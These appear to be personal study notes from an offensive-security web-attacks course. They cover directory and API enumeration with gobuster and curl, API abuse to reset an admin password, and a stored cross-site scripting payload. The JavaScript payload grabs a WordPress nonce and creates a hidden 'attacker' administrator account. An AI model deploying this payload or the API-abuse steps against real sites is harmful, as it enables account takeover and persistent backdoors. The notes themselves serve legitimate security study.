## Assessment Tools

### [[Nmap]]


sudo nmap -p80 --script=http-enum 192.168.50.20

### #Gobuster
```
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
```

```
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5 --exlude-length=0
```

### [[Burpsuite]] 

```
```
## Application Enumeration
	Debugger shows:
		JS under sources, click 'Prettify' which is double curly braces

#### Inspection HTTP Response Headers and Sitemaps via network tool and [[Burpsuite]]
	#### Network Tool
		Firefox Web Developer menu, 
			Refresh to show pages traffic

![[Pasted image 20230815154629.png]]
shows Response header indicating server type and version

##### show restricted search returns via [[curl]]
```
curl https://offsec.com/robots.txt
```

#### Enumerating and Abusing APIs

Enumerate API via go buster:

![[Pasted image 20230815155216.png]]

```
gobuster dir -u http://192.168.189.16 -w /usr/share/wordlists/dirb/big.txt -p pattern
```


-p pattern is a text file that looks like:

![[Pasted image 20230815155250.png]]

{GOBUSTER} acts as a placeholder here
The results seem to return two different locations that seem to be API end points (those ending in v1)

![[Pasted image 20230815155440.png]]

Now we can curl that, and see what appears to be the presence of an 'admin' account

We can use this info to attack again with [[Gobuster]] and insert the admin username at the end:

![[Pasted image 20230815155646.png]]

password obsiously seems nice, so lets [[curl]]:

![[Pasted image 20230815155723.png]]

Method is there, but since [[curl]] uses get method we should try [[post]] or [[put]]

Making sure API exists:

![[Pasted image 20230815155815.png]]

Now pass username and dummy password as [[json]] data via [[-d]] and use -H for json type

![[Pasted image 20230815155926.png]]

Try registering new user using [[json]] header, but specify username and password, returns:

![[Pasted image 20230815160010.png]]

This works:
		![[Pasted image 20230815160506.png]]

login API we discovered earlier, lets see if it works:

![[Pasted image 20230815160638.png]]

incorrect method when trying to change password. so lets try [[put]] method, also note that we pass the auth token from the last step to authenticate:

![[Pasted image 20230815160811.png]]

No error means it should work!


You can also do this in [[Burpsuite]] 

![[Pasted image 20230815161024.png]]

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++




## [[Cross-site]] Scripting

### [[Cross-site]] Scripting to create a new account Priv Esc


![[Pasted image 20230815163002.png]]

Creates new admin user:

![[Pasted image 20230815163211.png]]

To minify this code: navigate to [[jscompress]].com

![[Pasted image 20230815163255.png]]


We also need an encode javascript function

```
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

This function performs a new HTTP request towards the **/wp-admin/user-new.php** URL and saves the nonce value found in the HTTP response based on the regular expression. The regex pattern matches any alphanumeric value contained between the string _/ser" value="_ and double quotes.

Now that we've dynamically retrieved the nonce, we can craft the main function responsible for creating the new admin user.


```
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```



![[Pasted image 20230815163353.png]]
This is the console where you can add the encode function. Note the block that says 'insert minified javascript

Copy encoded string and insert with [[curl]] -i but before you send switch to [[Burpsuite]] and turn [[intercept]] on

![[Pasted image 20230815163521.png]]

Press forward in burp. and disable intercept. It should now be stored in the WordPress database. We should just log in and click on the visitor dashboard




## Exercises To-Do

- [ ] 1.1.1 (page 10)
- [ ] 1.1.2 (page 12)